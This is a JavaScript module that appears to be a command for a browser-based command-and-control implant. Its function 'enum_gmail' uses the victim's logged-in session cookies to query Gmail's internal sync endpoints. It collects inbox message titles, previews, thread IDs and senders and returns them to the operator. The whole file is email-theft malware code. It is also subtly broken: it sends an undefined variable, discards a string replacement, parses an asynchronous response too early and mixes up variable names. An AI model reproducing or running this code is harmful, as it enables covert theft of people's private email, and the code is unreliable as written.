exports.enum_gmail = function(task, command, params){
    try{
        let command_params = JSON.parse(params);
        var page_offset = command_params['page_offset'];
        if(!command_params.hasOwnProperty('page_offset')){return {"user_output": "Missing Page Offset", "completed": true, "status": "error"}}
        var xhr = new XMLHttpRequest();
        var key;
        xhr.onreadystatechange = function() {
            if (xhr.readyState == XMLHttpRequest.DONE) {
                var res = xhr.responseText;
            key = res.split('GM_ID_KEY="').pop().split('"')[0]; 
            }
        }
        xhr.open('GET', 'https://mail.google.com/mail/u/1/', true);
        //xhr.setRequestHeader("X-Gmail-Btai", "[null,null,[null,null,null,null,null,0,null,null,null,1,null,null,1,null,0,1,1,0,1,null,null,1,1,1,1,1,1,1,0,1,1,1,1,1,0,1,\"pt-BR\",\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:104.0) Gecko/20100101 Firefox/104.0\",1,0,25,null,0,1,0,1,1,1,1,1,null,1,1,0,1,1,0,0,null,0,1,null,1,0,null,1,0,null,1,0,1,0,null,0,0,0],null,\"f2e985974d\",null,25,\"gmail.pinto-server_20220825.07_p2\",1,5,\"\",-10800000,\"-03:00\",1,null,471825575,\"\",\"\",1662432171537,null,1177535]");
        //xhr.setRequestHeader("Content-Type", "application/json");
        //var body = "[null,[[[23,[\"thread-f:1742980504338360032\",[null,null,null,null,null,null,[[\"^io_lr\"],null,[\"msg-f:1742980504338360032\"]]]]]]],[1,1177535,null,null,[null,0],null,1],[1662432057310,1,1662432055031,0,199],2]"
        xhr.withCredentials = true;
        xhr.send(body);
        var xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function() {
            if (xhr.readyState == XMLHttpRequest.DONE) {
                alert(xhr.responseText);
            }
        }
        xhr.open('POST', 'https://mail.google.com/sync/u/1/i/s?hl=en-US&c=1&rt=r&pt=ji', true);
        var gmail_btai = "[null,null,[null,null,null,null,null,0,null,null,null,1,null,null,1,null,0,1,1,0,1,null,null,1,1,1,1,1,1,1,0,1,1,1,1,1,0,1,\"1\",\"1\",1,0,25,null,0,1,0,1,1,1,1,1,null,1,1,0,1,1,0,0,null,0,1,null,1,0,null,1,0,null,1,0,1,0,null,0,0,0],null,\"KEY_HERE\",null,25,\"1\",1,5,\"\",1,\"-03:00\",1,null,1,\"\",\"\",1,null,1]"
        xhr.setRequestHeader("X-Gmail-Btai", gmail_btai);
        xhr.setRequestHeader("Content-Type", "application/json");
        var body = "[[1,null,null,0],null,[1,null,null,null,[null,26],null,1],[null,1,1,0,1],2]"
        xhr.withCredentials = true;
        xhr.send(body);
        var xhr2 = new XMLHttpRequest();
        var resp2;
        xhr2.onreadystatechange = function() {
            if (xhr2.readyState == XMLHttpRequest.DONE) {
                resp2 = xhr2.responseText;
            }
        }
        xhr2.open('POST', 'https://mail.google.com/sync/u/1/i/bv?hl=en-US&c=1&rt=r&pt=ji', true);
        xhr2.setRequestHeader("X-Gmail-Btai", gmail_btai);
        xhr2.setRequestHeader("Content-Type", "application/json");
        var body2 = "[[49,50,null,\"((in:^i ((in:^smartlabel_personal) OR (in:^t))) OR (in:^i -in:^smartlabel_promo -in:^smartlabel_social))\",[null,null,null,null,0],\"\",1,1,null,1,PAGE_OFFSET,null,null,1,null,null,null,null,0],null,[0,1,null,null,1,1,1]]"
        xhr2.withCredentials = true;
        body2.replace("PAGE_OFFSET",page_offset);
        xhr2.withCredentials = true;
        xhr2.send(body2);
        var parsed = JSON.parse(resp2)
        var messages = parsed[2]
        messages_list = []
        for (var i = 0; i < parsed[2].length; i++) {
            var message = {}
            message["title"] = parsed[2][i][0][0]
            message["preview"] = parsed[2][i][0][1]
            message["thread_id"] = parsed[2][i][0][3]
            message["sender"] = parsed[2][i][0][4][0][1][1]
            message_list.push(message)
        }
        var contents = JSON.stringify(message_list);
        if(contents === ""){
            return {"user_output": "No output from command", "completed": true};
        }
        else if(contents === true){
            return {"user_output": "True", "completed": true};
        }
        else if(contents === false){
            return{"user_output": "False", "completed": true};
        }
        else if(contents === undefined){
            return {"user_output": "Empty Response", "completed": true};
        }
        return {"user_output": contents.toString(), "completed": true};
    }
    catch(error){
        return {"user_output": error.toString(), "status": "error", "completed": true};
    }
};
